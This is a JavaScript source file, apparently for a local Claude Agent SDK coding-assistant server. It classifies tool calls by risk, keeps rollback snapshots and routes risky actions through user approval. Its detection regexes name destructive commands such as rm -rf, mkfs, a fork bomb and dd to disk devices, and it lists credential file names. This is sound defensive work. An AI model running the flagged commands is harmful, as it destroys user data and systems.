      name: message.subtype,
      input: {
        status: message.status,
        summary: message.summary,
        description: message.description,
      },
    };
  }
  return null;
}

function sdkStatusText(message) {
  if (message?.type === "system" && message.subtype === "init") {
    return `SDK initialized - ${message.model || "model"} - ${message.permissionMode || "default"}`;
  }
  if (message?.type === "system" && message.subtype === "status" && message.status) {
    return `SDK status: ${message.status}`;
  }
  if (message?.type === "auth_status" && Array.isArray(message.output)) {
    return message.output.join("\n");
  }
  if (message?.type === "system" && message.subtype === "api_retry") {
    return `Sparkloom gateway retry ${message.attempt}/${message.max_retries}`;
  }
  if (message?.type === "system" && message.subtype === "permission_denied") {
    return `Permission denied: ${message.tool_name || "tool"}`;
  }
  return "";
}

// ---- 工具调用翻译（人话 + 风险等级），给审批卡片用 ----
function translateTool(toolName, input) {
  const name = String(toolName || "");
  const inp = input && typeof input === "object" ? input : {};
  const file = String(inp.file_path || inp.path || inp.notebook_path || "");
  const shortFile = file ? file.replace(/\\/g, "/").split("/").filter(Boolean).slice(-2).join("/") : "";
  switch (name) {
    case "Read":
    case "Glob":
    case "Grep":
    case "LS":
      return { risk: "safe", humanHint: `查看 ${shortFile || "文件内容"}` };
    case "TodoWrite":
    case "TaskCreate":
    case "TaskUpdate":
    case "TaskList":
    case "TaskGet":
      return { risk: "safe", humanHint: "记录任务清单" };
    case "Bash":
      return translateBash(String(inp.command || ""));
    case "Edit":
    case "MultiEdit":
      return { risk: "warn", humanHint: `修改文件 ${shortFile}` };
    case "Write":
    case "NotebookEdit":
      return { risk: "warn", humanHint: `创建/覆盖文件 ${shortFile}` };
    case "WebSearch":
    case "WebFetch":
      return { risk: "warn", humanHint: "联网查询信息" };
    default:
      return { risk: "warn", humanHint: `执行操作：${name}` };
  }
}

function translateBash(cmd) {
  const c = String(cmd || "").toLowerCase().trim();
  if (!c) return { risk: "warn", humanHint: "执行命令" };
  // M9: 解释器包裹（bash/sh/zsh/dash/ksh/fish/csh -c ...）一律 danger——
  // 包裹体内命令字符串无法可靠拆分判定，按最严处理防止 ;/&&/$() 注入伪装成 safe
  if (/\b(bash|sh|zsh|dash|ksh|fish|csh|tcsh)\s+(-[a-z]*c|-c)\b/.test(c)) {
    return { risk: "danger", humanHint: "通过 shell 解释器执行（命令体可能含任意破坏性操作，无法静态判定）" };
  }
  if (/\b(powershell|pwsh)\s+(-[a-z]*command|-command|-c)\b/.test(c)) {
    return { risk: "danger", humanHint: "通过 PowerShell 执行命令（命令体可能含任意破坏性操作）" };
  }
  if (/(^|\s)(rm|del|erase|truncate|rmdir)\s/.test(c) || /remove-item/.test(c)) {
    // P2-3 危险命令 impact：解析具体目标路径，让审批卡片直接显示影响范围
    const targetMatch = c.match(/(?:rm|del|erase|truncate|rmdir|remove-item)\s+(?:-[a-z]+\s+)*([^\s|;&><]+)/);
    const target = targetMatch ? targetMatch[1].replace(/^["']|["']$/g, "") : "";
    const forced = /-rf|--force|\/[fqs]/.test(c);
    if (forced) {
      return {
        risk: "danger",
        humanHint: target
          ? `强制删除「${target}」及其所有内容（不可恢复）`
          : "强制删除文件或文件夹（不可恢复）",
      };
    }
    return {
      risk: "danger",
      humanHint: target ? `删除「${target}」` : "删除文件或文件夹",
    };
  }
  if (/git\s+push|git\s+reset\s+--hard|git\s+push\s+--force|git\s+commit\s+--amend/.test(c)) {
    // 区分 force push 和普通 push
    if (/git\s+push\s+--force|git\s+push\s+-f\b|git\s+push\s+--force-with-lease/.test(c)) {
      const branchMatch = c.match(/git\s+push\s+(?:--force[a-z-]*\s+)?(?:origin\s+)?([^\s|;&]+)/);
      const branch = branchMatch ? branchMatch[1] : "";
      return {
        risk: "danger",
        humanHint: branch
          ? `强制推送「${branch}」到远程（会覆盖远程历史）`
          : "Git 强制推送（会覆盖远程历史）",
      };
    }
    if (/git\s+reset\s+--hard/.test(c)) {
      return { risk: "danger", humanHint: "Git 硬重置（丢弃未提交改动 + 改写本地历史）" };
    }
    if (/git\s+commit\s+--amend/.test(c)) {
      return { risk: "danger", humanHint: "Git 修改上一条提交（重写历史，已推送需 force push）" };
    }
    const branchMatch = c.match(/git\s+push\s+(?:origin\s+)?([^\s|;&]+)/);
    const branch = branchMatch ? branchMatch[1] : "";
    return {
      risk: "danger",
      humanHint: branch ? `Git 推送「${branch}」到远程仓库` : "Git 推送到远程仓库",
    };
  }
  if (/format\s+[a-z]:|mkfs/.test(c)) return { risk: "danger", humanHint: "格式化磁盘（极度危险，全部数据将丢失）" };
  if (/taskkill|stop-process/.test(c)) {
    const pidMatch = c.match(/(?:taskkill|stop-process)[^]*?(?:\/pid\s+|-id\s+|\/im\s+|-name\s+)([^\s]+)/);
    const target = pidMatch ? pidMatch[1] : "";
    return {
      risk: "danger",
      humanHint: target ? `终止进程「${target}」（可能导致未保存数据丢失）` : "终止进程",
    };
  }
  // P2-3 危险命令 impact 新增模式
  if (/\b:.\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;/.test(c) || /fork\s*bomb/i.test(c)) {
    return { risk: "danger", humanHint: "Fork 炸弹（瞬间耗尽系统资源，极度危险）" };
  }
  // M9: chmod -R 升级为 danger——递归改权限不可逆、影响整个子树，warn 在 auto 模式下会被静默放行
  if (/\bchmod\s+(-[a-z]*R[a-z]*|--recursive)\b/.test(c)) {
    const targetMatch = c.match(/chmod\s+(?:-[a-z]*R[a-z]*|--recursive)\s+\S+\s+([^\s|;&]+)/);
    const target = targetMatch ? targetMatch[1] : "";
    return {
      risk: "danger",
      humanHint: target ? `递归修改「${target}」的权限（影响子目录全部文件，不可逆）` : "递归修改权限（不可逆）",
    };
  }
  // L3: 同类递归权限/所有者操作补全——chown -R（递归改所有者）、Windows attrib /s、icacls /sub
  // 原先落入末尾 warn 会在 auto 模式下被静默放行；与 chmod -R 同档不可逆且影响整个子树，必须 danger
  if (/\bchown\s+(-[a-z]*R[a-z]*|--recursive)\b/.test(c) || /\battrib\b.*\b\/s\b/i.test(c) || /\bicacls\b.*\b\/sub\b/i.test(c)) {
    const chownMatch = c.match(/chown\s+(?:-[a-z]*R[a-z]*|--recursive)\s+\S+\s+([^\s|;&]+)/);
    const attribMatch = c.match(/attrib(?:\s+[+-][RAHSDI]+)?\s+([^\s|;&]+)/i);
    const icaclsMatch = c.match(/icacls\s+([^\s|;&]+)/i);
    const target = (chownMatch && chownMatch[1]) || (attribMatch && attribMatch[1]) || (icaclsMatch && icaclsMatch[1]) || "";
    return {
      risk: "danger",
      humanHint: target
        ? `递归修改「${target}」的权限或所有者（影响子目录全部文件，可能破坏系统）`
        : "递归修改权限或所有者（可能破坏系统可用性）",
    };
  }
  if (/>\s*\/dev\/sda|dd\s+if=.*of=\/dev\//.test(c)) {
    return { risk: "danger", humanHint: "直接写入磁盘设备（可能损坏整个磁盘）" };
  }
  // M9: find 删除/危险执行
  if (/\bfind\b.*(-delete|-execdir|--exec\s+rm|-exec\s+rm)\b/.test(c)) {
    return { risk: "danger", humanHint: "find 执行删除或递归执行 rm（不可逆）" };
  }
  // M9: cp /dev/null → 目标文件被清空
  if (/\bcp\s+\/dev\/null\s+/.test(c)) {
    return { risk: "danger", humanHint: "用 cp /dev/null 清空目标文件内容" };
  }
  // M9: mv ... /dev/null —— 数据丢失
  if (/\bmv\s+\S+\s+\/dev\/null(\s|$)/.test(c)) {
    return { risk: "danger", humanHint: "mv 到 /dev/null（文件内容将丢失）" };
  }
  if (/(npm|pnpm|yarn)\s+(install|i|add)|pip\s+install|cargo\s+add|brew\s+install/.test(c)) {
    return { risk: "warn", humanHint: "安装软件包（会下载并改动项目）" };
  }
  if (/(npm|pnpm|yarn)\s+(run|exec|dlx)|npx|node\s|python\s|go\s+run/.test(c)) {
    return { risk: "warn", humanHint: "运行程序或脚本" };
  }
  if (/curl|wget|invoke-webrequest/.test(c)) return { risk: "warn", humanHint: "从网络下载或请求" };
  if (/git\s+(commit|merge|rebase|checkout|switch|stash)/.test(c)) return { risk: "warn", humanHint: "Git 改动本地仓库" };
  if (/^(ls|dir|cat|type|echo|cd|pwd|tree|where|which)\b/.test(c)) return { risk: "safe", humanHint: "查看信息（只读）" };
  if (/git\s+(status|log|diff|branch|show|remote)/.test(c)) return { risk: "safe", humanHint: "查看 Git 信息（只读）" };
  if (/(mkdir|touch|new-item)\b/.test(c)) return { risk: "safe", humanHint: "新建文件或文件夹" };
  if (/tsc\s+--noemit|eslint|prettier|jest|vitest|pytest|cargo\s+check/.test(c)) return { risk: "safe", humanHint: "运行检查或测试（只读）" };
  return { risk: "warn", humanHint: "执行命令" };
}

// ---- checkpoint 快照（一键回滚用）----
const SNAPSHOT_EXCLUDE = new Set([
  "node_modules", ".git", ".sparkloom", "dist", "build", ".next",
  "__pycache__", ".cache", ".turbo", "out", "target", ".gradle",
  ".ssh", ".aws", ".gnupg",
]);

// E-3 全局 checkpoint 注册表：让 HTTP diff 路由和任务结束后的 rollback 仍能找到 snapshot。
// task-level checkpoints Map 会随 task 完成被释放，这里作为持久层；与磁盘 snapshotsDir 同生命周期。
const globalCheckpoints = new Map();
const GLOBAL_CHECKPOINTS_MAX = 50;

function isSensitiveName(name) {
  const n = String(name || "").toLowerCase();
  if (/^\.env/.test(n)) return true;
  if ([".npmrc", ".pypirc", ".netrc", "credentials", "credentials.json", ".htpasswd"].includes(n)) return true;
  if (/\.(pem|key|pfx|keystore|jks|p12)$/i.test(n)) return true;
  if (/^secrets?\./i.test(n)) return true;
  if (/^id_(rsa|dsa|ecdsa|ed25519)$/i.test(n)) return true;
  return false;
}

async function copyDirSnapshot(src, dest) {
  await mkdir(dest, { recursive: true });
  let entries = [];
  try {
    entries = await readdir(src, { withFileTypes: true });
  } catch {
    return;
  }
  for (const entry of entries) {
    if (SNAPSHOT_EXCLUDE.has(entry.name)) continue;
    if (isSensitiveName(entry.name)) continue;
    const s = path.join(src, entry.name);
    const d = path.join(dest, entry.name);
    if (entry.isDirectory()) {
      await copyDirSnapshot(s, d);
    } else if (entry.isSymbolicLink()) {
      continue;
    } else {
      try {
        await copyFile(s, d);
      } catch {
        // 跳过无法复制的文件（权限、占用等）
      }
    }
  }
}

async function syncDirRollback(src, dest) {
  // H5: dest 先 realpath——rollback 必须作用在真实路径上，不能穿过 cwd 内的符号链接误删目标处文件
  const destReal = await safeRealpath(dest);
  let entries = [];
  try {
    entries = await readdir(destReal, { withFileTypes: true });
  } catch {
    // 目标目录不存在，直接复制
  }
  for (const entry of entries) {
    if (SNAPSHOT_EXCLUDE.has(entry.name)) continue;
    // H5: 跳过符号链接——rm(recursive,force) 会穿过链接删目标处真实文件，与 copyDirSnapshot 一致
    if (entry.isSymbolicLink()) continue;
    const target = path.join(destReal, entry.name);
    try {
      // H5: 二次 lstat 守卫——race condition 下 entry 类型可能变化，再次确认不是符号链接
      const lst = await lstat(target).catch(() => null);
      if (lst && lst.isSymbolicLink()) continue;
      await rm(target, { recursive: true, force: true });
    } catch {
      // 忽略删除失败
    }
  }
  await copyDirSnapshot(src, destReal);
}

function snapshotsDir() {
  return path.join(userConfigDir(), "snapshots");
}

async function createCheckpoint(cwd, label) {
  const id = `cp_${Date.now()}_${randomBytes(4).toString("hex")}`;
  const dir = path.join(snapshotsDir(), id);
  await mkdir(snapshotsDir(), { recursive: true });
  // H5: 记录 cwd 的 realpath——rollback 时比对，发现 cwd 被改成符号链接则拒绝执行
  const cwdReal = await safeRealpath(cwd);
  await copyDirSnapshot(cwdReal, dir);
  const snap = { id, dir, cwd, cwdReal, label: String(label || "").slice(0, 40), createdAt: Date.now() };
  // 同步注册到全局表，供 HTTP diff 与任务结束后的 fallback rollback 查询
  globalCheckpoints.set(id, snap);
  // 维护上限：FIFO 按创建时间清理内存条目（磁盘由 pruneSnapshots 单独管）
  if (globalCheckpoints.size > GLOBAL_CHECKPOINTS_MAX) {
    const oldest = Array.from(globalCheckpoints.entries())
      .sort((a, b) => (a[1].createdAt || 0) - (b[1].createdAt || 0));
    for (const [key] of oldest.slice(0, globalCheckpoints.size - GLOBAL_CHECKPOINTS_MAX)) {
      globalCheckpoints.delete(key);
    }
  }
  await pruneSnapshots(20);
  return snap;
}

async function pruneSnapshots(maxKeep = 20) {
  let entries = [];
  try {
    entries = await readdir(snapshotsDir(), { withFileTypes: true });
  } catch {
    return;
  }
  const dirs = entries.filter((e) => e.isDirectory() && e.name.startsWith("cp_")).map((e) => e.name).sort().reverse();
  const removed = dirs.slice(maxKeep);
  for (const name of removed) {
    try {
      await rm(path.join(snapshotsDir(), name), { recursive: true, force: true });
    } catch {
      // 忽略清理失败
    }
    // 同步清理 globalCheckpoints 中已删磁盘的条目，避免悬挂引用
    globalCheckpoints.delete(name);
  }
}

async function rollbackCheckpoint(snap) {
  if (!snap || !snap.dir) throw new Error("快照不存在，无法回滚");
  // H5: 防穿链接 rm——比对当前 cwd 的 realpath 与快照创建时记录的 cwdReal
  // 如果用户在创建快照后把 cwd 改成了符号链接指向他处，syncDirRollback 顶层 rm 会误删目标处的真实文件
  const currentReal = await safeRealpath(snap.cwd);
  if (snap.cwdReal && currentReal !== snap.cwdReal) {
    throw new Error("项目目录解析后路径与快照记录不一致，已拒绝回滚以防穿过符号链接");
  }
  await syncDirRollback(snap.dir, currentReal);
}

// 任务 1 差异逐块 Apply：在 cwd 下读文件 → 替换 oldText→newText → 写回 → 拍快照
// 安全：filePath 必须解析到 cwd 之下；敏感文件名拒绝；oldText 必须在文件中唯一匹配
async function applyHunksToFile(cwd, filePath, hunks) {
  if (!cwd) throw new Error("项目目录未指定");
  if (!filePath) throw new Error("文件路径未指定");
  // H5: 先 realpath cwd（cleanCwd 已 realpath 过，调用方传的应是真实路径；但兜底再解析一次防穿透）
  const cwdReal = await safeRealpath(cwd);
  const abs = path.resolve(cwdReal, String(filePath));
  // H5: abs 也要 realpath（文件可能不存在，safeRealpath 会回退到 parent-real + basename）
  const absReal = await safeRealpath(abs);
  // 路径穿越拦截：解析后必须在 cwd 之内（非 Windows 也允许盘符不同时直接拒）
  const rel = path.relative(cwdReal, absReal);
  if (rel.startsWith("..") || path.isAbsolute(rel)) {
    throw new Error("文件路径越权，必须在项目目录之内");
  }
  // H5: 二次校验 absReal 必须仍在 cwdReal 内（防 cwd 内的符号链接跳出）
  if (!isPathInside(absReal, cwdReal)) {
    throw new Error("文件路径解析后越权（疑似符号链接跳出 cwd），已拒绝");
  }
  // 文件名黑名单（与快照一致）：.env / 密钥 / 凭据 等
  const base = path.basename(absReal);
  if (isSensitiveName(base)) {
    throw new Error(`敏感文件 ${base} 不允许通过 Apply Hunk 修改`);
  }
  // 读当前内容（不存在则视为空，便于纯新增）
  let content;
  try {
    content = await readFile(absReal, "utf8");
  } catch {
    content = "";
  }
  // 顺序应用每个 hunk：要求 oldText 在文件中存在；若多个匹配则拒绝（歧义）
  for (const hunk of Array.isArray(hunks) ? hunks : []) {
    const oldText = typeof hunk?.oldText === "string" ? hunk.oldText : "";
    const newText = typeof hunk?.newText === "string" ? hunk.newText : "";
    if (!oldText) {
      // H3: 纯插入不能用 append——会把"在顶部加 import"误装到文件末尾破坏结构
      // 改用 beforeAnchor / afterAnchor 锚点定位，无锚点且文件非空时拒绝（防静默错放）
      const beforeAnchor = typeof hunk?.beforeAnchor === "string" ? hunk.beforeAnchor : "";
      const afterAnchor = typeof hunk?.afterAnchor === "string" ? hunk.afterAnchor : "";
      if (beforeAnchor) {
        const hits = content.split(beforeAnchor).length - 1;
        if (hits === 0) throw new Error("beforeAnchor 在文件中找不到匹配，已中止");
        if (hits > 1) throw new Error("beforeAnchor 在文件中匹配多处，存在歧义，已中止");
        content = content.replace(beforeAnchor, () => beforeAnchor + newText);
      } else if (afterAnchor) {
        const hits = content.split(afterAnchor).length - 1;
        if (hits === 0) throw new Error("afterAnchor 在文件中找不到匹配，已中止");
        if (hits > 1) throw new Error("afterAnchor 在文件中匹配多处，存在歧义，已中止");
        content = content.replace(afterAnchor, () => newText + afterAnchor);
      } else if (content.length === 0) {
        // 文件确为空：纯追加是唯一合理位置
        content = newText;
      } else {
        throw new Error("该改动块为纯插入但缺少 beforeAnchor/afterAnchor，且目标文件非空，已拒绝（防误追加到文件末尾）。请使用整段替换或补全锚点。");
      }
      continue;
    }
    const count = content.split(oldText).length - 1;
    if (count === 0) {
      throw new Error("该改动块在文件中找不到匹配（可能已被修改），已中止");
    }
    if (count > 1) {
      throw new Error("该改动块在文件中匹配多处，存在歧义，已中止。请整段粘贴更长的上下文。");
    }
    // M3: 函数形式替换——避免 newText 中的 $& / $$ / $` / $' 被当作替换模式解释而损坏源文件
    content = content.replace(oldText, () => newText);
  }
  // 写回（含子目录自动创建）
  await mkdir(path.dirname(absReal), { recursive: true });
  await writeFile(absReal, content, "utf8");
  // 复用 checkpoint 机制：便于用户后续一键回滚这次 Apply
  const checkpoint = await createCheckpoint(cwdReal, `apply-hunk ${base}`);
  return { ok: true, checkpointId: checkpoint.id, file: abs };
}

// E-3 计算快照 vs 当前 cwd 的文件级 diff（不返回文件内容，避免敏感数据外泄）
// 返回 { added, modified, deleted, totalChanged }
// - added:   cwd 有但快照没有（回滚后会丢失）
// - modified: 两边都有但内容/大小不一致（回滚后会还原）
// - deleted: 快照有但 cwd 没有（回滚后会恢复）
async function computeCheckpointDiff(snap) {
  if (!snap || !snap.dir) throw new Error("快照不存在");
  const snapFiles = await walkSnapshotFiles(snap.dir, "");
  const cwdFiles = await walkSnapshotFiles(snap.cwd, "");
  const added = [];
  const modified = [];
  const deleted = [];
  for (const [rel, info] of cwdFiles) {
    const snapInfo = snapFiles.get(rel);
    if (!snapInfo) {
      added.push(rel);
    } else if (info.size !== snapInfo.size || info.mtime > snapInfo.mtime + 1000) {
      modified.push(rel);
    }
  }
  for (const [rel] of snapFiles) {
    if (!cwdFiles.has(rel)) deleted.push(rel);
  }
  // 各类最多保留 200 条，避免超大 diff 撑爆前端 modal
  const cap = (arr) => arr.sort().slice(0, 200);
  return {
    added: cap(added),
    modified: cap(modified),
    deleted: cap(deleted),
    totalChanged: added.length + modified.length + deleted.length,
    addedTotal: added.length,
    modifiedTotal: modified.length,
    deletedTotal: deleted.length,
    snapshotedAt: snap.createdAt || null,
    cwd: snap.cwd,
  };
}

// 收集目录下所有文件（按 SNAPSHOT_EXCLUDE/isSensitiveName 过滤），返回 Map<relPath, {size, mtime}>
async function walkSnapshotFiles(root, prefix) {
  const result = new Map();
  let entries = [];
  try {
    entries = await readdir(root, { withFileTypes: true });
  } catch {
    return result;
  }
  for (const entry of entries) {
    if (SNAPSHOT_EXCLUDE.has(entry.name)) continue;
    if (isSensitiveName(entry.name)) continue;
    const rel = prefix ? `${prefix}/${entry.name}` : entry.name;
    const abs = path.join(root, entry.name);
    if (entry.isDirectory()) {
      const sub = await walkSnapshotFiles(abs, rel);
      for (const [k, v] of sub) result.set(k, v);
    } else if (entry.isSymbolicLink()) {
      continue;
    } else {
      try {
        const s = await stat(abs);
        result.set(rel, { size: s.size, mtime: s.mtimeMs });
      } catch {
        // 跳过无法 stat 的文件
      }
    }
  }
  return result;
}

// ---- 审批管理器（每个任务一个，桥接 canUseTool 与前端审批卡片）----
function createApprovalManager(emit) {
  // pending Map 存 { resolve, risk }：risk 用于 setAutoAccept 区分危险操作（danger 不放行）
  const pending = new Map();
  // session 级 auto-accept：用户点过"全部允许本次"后，本任务后续审批一律放行（危险操作除外）
  let autoAccept = false;
  return {
    request(approval) {
      // auto-accept 开启且非危险操作时，跳过用户确认直接放行（保留危险操作的硬拦截）
      if (autoAccept && approval.risk !== "danger") {
        emit({ type: "approval_auto_allowed", approvalId: approval.approvalId, toolName: approval.toolName });
        return Promise.resolve("allow");
      }
      emit({ type: "approval_request", ...approval });
      return new Promise((resolve) => {
        // 5min 超时自动 deny（防用户切走后审批无限挂起、SDK 连接耗尽）；respond/rejectAll 调 wrapper 自动 clearTimeout
        const timer = setTimeout(() => {
          const entry = pending.get(approval.approvalId);
          if (entry) {
            pending.delete(approval.approvalId);
            emit({ type: "approval_timeout", approvalId: approval.approvalId });
            entry.resolve("deny");
          }
        }, Number(process.env.SPARKLOOM_APPROVAL_TIMEOUT_MS) || 5 * 60 * 1000);
        pending.set(approval.approvalId, {
          risk: approval.risk || "warn",
          resolve: (decision) => { clearTimeout(timer); resolve(decision); },
        });
      });
    },
    respond(approvalId, decision) {
      const entry = pending.get(approvalId);
      if (entry) {
        pending.delete(approvalId);
        entry.resolve(decision === "allow" ? "allow" : "deny");
      }
    },
    rejectAll() {
      for (const entry of pending.values()) entry.resolve("deny");
      pending.clear();
    },
    setAutoAccept(value) {
      autoAccept = Boolean(value);
      if (autoAccept) {
        // H2/H4: 已挂起的非危险审批立即放行；danger 保持挂起等用户手动确认（与代码注释/UI 文案一致）；
        // 同时 emit approval_auto_allowed 让前端清理那些已渲染为 running 的审批卡片（toolUseId=approvalId）
        for (const [id, entry] of pending.entries()) {
          if (entry.risk === "danger") continue;
          pending.delete(id);
          emit({ type: "approval_auto_allowed", approvalId: id });
          entry.resolve("allow");
        }
      }
    },
    isAutoAccept() {
      return autoAccept;
    },
  };
}

async function loadClaudeAgentSdk() {
  if (process.env.SPARKLOOM_DISABLE_AGENT_SDK === "1") return null;
  try {
    return await import("@anthropic-ai/claude-agent-sdk");
  } catch {
    return null;
  }
}

async function claudeAgentSdkStatus() {
  try {
    const sdk = await import("@anthropic-ai/claude-agent-sdk");
    let version = null;
    try {
      const pkg = JSON.parse(await readFile(path.resolve(__dirname, "../node_modules/@anthropic-ai/claude-agent-sdk/package.json"), "utf8"));
      version = typeof pkg.version === "string" ? pkg.version : null;
    } catch {
      // Version is nice to have, not required for readiness.
    }
    return {
      name: "Claude Agent SDK",
      ok: typeof sdk.query === "function",
      version,
      error: typeof sdk.query === "function" ? null : "query() export not found",
    };
  } catch (error) {
    return {
      name: "Claude Agent SDK",
      ok: false,
      version: null,
      error: error instanceof Error ? error.message : "not installed",
    };
  }
}

async function runClaudeSdkTask({ prompt, model, cwd, maxTurns, permissionMode, originalMode, env, emit, signal, approvalManager, resume, images }) {
  const sdk = await loadClaudeAgentSdk();
  if (!sdk?.query) {
    return { ok: false, unavailable: true, error: "Claude Agent SDK is not installed" };
  }

  // Vision：前端把图片转 base64 + media_type 透传。SDK prompt 接受 string 或 content blocks 数组。
  // 图片走 Claude image content block，文字内容必须保留为第一个 text block 让 SDK 识别为 user message。
  const safeImages = Array.isArray(images)
    ? images
        .filter((img) => img && typeof img === "object" && typeof img.data === "string" && typeof img.mediaType === "string")
        .slice(0, 8) // 上限 8 张，防 WS 滥用
        .map((img) => ({
          type: "image",
          source: { type: "base64", media_type: String(img.mediaType), data: String(img.data) },
        }))
    : [];
  const sdkPrompt = safeImages.length > 0
    ? [{ type: "text", text: String(prompt || "") }, ...safeImages]
    : String(prompt || "");

  let output = "";
  let producedOutput = false;
  const abortController = new AbortController();
  const forwardAbort = () => abortController.abort();
  if (signal) {
    if (signal.aborted) abortController.abort();
    signal.addEventListener("abort", forwardAbort, { once: true });
  }
  try {
    const queryOptions = {
      abortController,
      resume: resume || undefined,
      cwd,
      env: {
        ...minimalEnv(),
        ...env,
        CLAUDE_AGENT_SDK_CLIENT_APP: `sparkloom-agent/${VERSION}`,
      },
      includePartialMessages: true,
      includeHookEvents: true,
      forwardSubagentText: true,
      enableFileCheckpointing: true,
      tools: { type: "preset", preset: "claude_code" },
      permissionMode,
      maxTurns,
      model: model || undefined,
      canUseTool: async (toolName, input) => {
        const tn = String(toolName || "");
        const { risk, humanHint } = translateTool(toolName, input);
        // 任务 4：yolo 全自动无确认——所有工具直接放行，不弹审批（permissionMode=bypassPermissions 已让 SDK 不再询问，canUseTool 也强制 allow）
        if (originalMode === "yolo") {
          return { behavior: "allow" };
        }
        // M9: auto 模式收紧——只 safe（非 Bash）自动放行；warn/danger 一律走审批
        // 与下方 risk === "safe" && tn !== "Bash" 分支共享同一判定，注释中"Bash 永远审批"的意图真正落地
        // （原代码 if (risk !== "danger") return allow 把 warn 级 Bash 也静默放行，依赖 translateBash 正则不可靠）
        if (originalMode === "auto") {
          // 落到下方统一的 safe 非 Bash 放行分支；warn/danger/Bash 走 approvalManager
        } else if (!approvalManager) {
          return { behavior: "allow" };
        }
        // 只读工具自动放行（Read/Glob/Grep/LS 等）；但 Bash 永远审批——防 ;/&&/|/$() 命令注入伪装成 safe
        if (risk === "safe" && tn !== "Bash") {
          return { behavior: "allow" };
        }
        const approvalId = randomBytes(16).toString("hex");
        const decision = await approvalManager.request({
          approvalId,
          toolName: tn,
          input: /^(Edit|Write|MultiEdit|NotebookEdit)$/.test(tn) ? redactSensitive(JSON.stringify(input || {})).slice(0, 20000) : redactSensitive(JSON.stringify(input || {})).slice(0, 800),
          risk,
          humanHint,
        });
        return decision === "allow" ? { behavior: "allow" } : { behavior: "deny", message: "用户拒绝了此操作" };
      },
    };

    emit({ type: "status", text: "Claude Agent SDK started" });
    for await (const message of sdk.query({ prompt: sdkPrompt, options: queryOptions })) {
      const status = sdkStatusText(message);
      if (status) emit({ type: "status", text: redactSensitive(status) });

      const tool = sdkToolEvent(message);
      if (tool) {
        const tn = String(tool.name || "");
        // TodoWrite：Claude Code 招牌 UX，边干边维护 todo list。不再静默放行，
        // emit 成独立 todo_list 事件让前端渲染进度面板
        if (tn === "TodoWrite" && tool.input && Array.isArray(tool.input.todos)) {
          emit({
            type: "todo_list",
            todos: tool.input.todos
              .filter((t) => t && typeof t === "object")
              .map((t) => ({
                content: String(t.content || ""),
                status: t.status === "completed" ? "completed" : t.status === "in_progress" ? "in_progress" : "pending",
                activeForm: String(t.activeForm || t.content || ""),
              })),
          });
        }
        const isEditLike = /^(Edit|Write|MultiEdit|NotebookEdit)$/.test(tn);
        const inputStr = redactSensitive(JSON.stringify(tool.input || {}));
        emit({ type: "tool", toolUseId: tool.id || "", tool: redactSensitive(tool.name), input: isEditLike ? inputStr.slice(0, 20000) : inputStr.slice(0, 1200) });
      }

      // 工具执行结果（来自 user 消息的 tool_result），让前端工具卡片显示输出
      // emit 带 truncated 标记 + 前 2000 字符摘要；超过则附 fullContent（上限 50KB 防 WS 滥用）
      if (message?.type === "user" && Array.isArray(message.message?.content)) {
        for (const item of message.message.content) {
          if (item?.type === "tool_result") {
            const raw = typeof item.content === "string" ? item.content : JSON.stringify(item.content || "");
            const redacted = redactSensitive(raw);
            const SUMMARY_LIMIT = 2000;
            const FULL_LIMIT = 50_000;
            const truncated = redacted.length > SUMMARY_LIMIT;
            const summary = truncated ? redacted.slice(0, SUMMARY_LIMIT) : redacted;
            const fullContent = truncated ? redacted.slice(0, FULL_LIMIT) : null;
            const fullTruncatedByCap = truncated && redacted.length > FULL_LIMIT;
            emit({
              type: "tool_result",
              toolUseId: item.tool_use_id || "",
              content: summary,
              fullContent,
              truncated,
              fullTruncatedByCap,
              isError: Boolean(item.is_error),
            });
          }
        }
      }

      const text = sdkStreamText(message, producedOutput);
      if (text) {
        producedOutput = true;
        output += text;
        emit({ type: "delta", text: redactSensitive(text) });
      }

      if (message?.type === "result") {
        emit({
          type: "usage",
          inputTokens: message.usage?.input_tokens ?? message.usage?.inputTokens ?? 0,
          outputTokens: message.usage?.output_tokens ?? message.usage?.outputTokens ?? 0,
          cacheCreation: message.usage?.cache_creation_input_tokens ?? 0,
          cacheRead: message.usage?.cache_read_input_tokens ?? 0,
          costUsd: message.total_cost_usd ?? message.cost_usd ?? 0,
          durationMs: message.duration_ms ?? null,
          numTurns: message.num_turns ?? null,
        });
        if (message.subtype === "success") {
          return {
            ok: true,
            output: redactSensitive(output || message.result || ""),
            stderr: "",
            exitCode: 0,
            sdk: true,
            result: message,
            sessionId: message.session_id || null,
          };
        }
        const error = Array.isArray(message.errors) && message.errors.length > 0
          ? message.errors.join("\n")
          : `Claude Agent SDK failed: ${message.subtype || "unknown"}`;
        return {
          ok: false,
          output: redactSensitive(output),
          stderr: redactSensitive(error),
          exitCode: null,
          sdk: true,
          producedOutput,
          sessionId: message.session_id || null,
        };
      }
    }
    return {
      ok: true,
      output: redactSensitive(output),
      stderr: "",
      exitCode: 0,
      sdk: true,
    };
  } catch (error) {
    return {
      ok: false,
      unavailable: false,
      output: redactSensitive(output),
      stderr: redactSensitive(error instanceof Error ? error.message : String(error)),
      exitCode: null,
      sdk: true,
      producedOutput,
    };
  } finally {
    if (signal) signal.removeEventListener("abort", forwardAbort);
  }
}

async function runClaudeTask(body, emit = () => {}, signal = null, approvalManager = null) {
  // Vision：仅有图片无文字时允许空 prompt（默认补一句让模型看图）
  const hasImages = Array.isArray(body.images) && body.images.length > 0;
  const prompt = hasImages && !String(body.prompt || "").trim()
    ? "请查看附带的图片。"
    : cleanPrompt(body.prompt);
  const model = cleanModel(body.model);
  const maxTurns = cleanMaxTurns(body.maxTurns);
  const originalMode = String(body.mode || "default");
  const permissionMode = permissionModeFor(originalMode);
  let cwd;
  try {
    cwd = await cleanCwd(body.cwd);
  } catch (error) {
    return {
      ok: false,
      error: redactSensitive(error instanceof Error ? error.message : String(error)),
      exitCode: null,
      permissionMode,
      model: model || null,
      cwd: null,
      maxTurns,
      output: "",
      stderr: "",
    };
  }
  // 任务开始前拍快照，供前端"一键回滚"
  let checkpoint = null;
  try {
    checkpoint = await createCheckpoint(cwd, prompt.slice(0, 40));
    emit({ type: "checkpoint", checkpointId: checkpoint.id, label: checkpoint.label, createdAt: checkpoint.createdAt });
  } catch {
    // 快照失败不阻塞任务执行
  }

  const env = await claudeGatewayEnv(model);
  try {
    await preflightSparkloomGateway(env, model || env.ANTHROPIC_MODEL || "");
  } catch (error) {
    return {
      ok: false,
      error: redactSensitive(error instanceof Error ? error.message : String(error)),
      exitCode: null,
      permissionMode,
      model: model || env.ANTHROPIC_MODEL || null,
      cwd,
      maxTurns,
      output: "",
      stderr: "",
    };
  }

